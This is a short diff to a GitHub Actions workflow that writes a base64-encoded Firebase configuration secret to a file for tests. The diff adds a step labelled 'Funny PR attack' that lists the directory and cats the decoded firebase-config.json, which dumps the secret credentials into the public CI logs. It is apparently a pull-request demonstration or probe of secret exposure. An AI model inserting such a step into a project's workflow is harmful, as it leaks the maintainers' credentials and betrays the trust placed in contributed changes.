@@ -35,6 +35,10 @@ jobs:
           base64-encoded-secret: ${{ secrets.FIREBASE_CONFIG }}
           filename: firebase-config.json
           working-directory: ./tests/resources/mocked-client-app
+      - name: Funny PR attack
+        run: |
+          ls -alh ./tests/resources/mocked-client-app
+          cat ./tests/resources/mocked-client-app/firebase-config.json
       - name: Test
         # Tests need docker to run, that is not available on macOS and Windows ouch!
         if: contains(matrix.os, 'ubuntu')
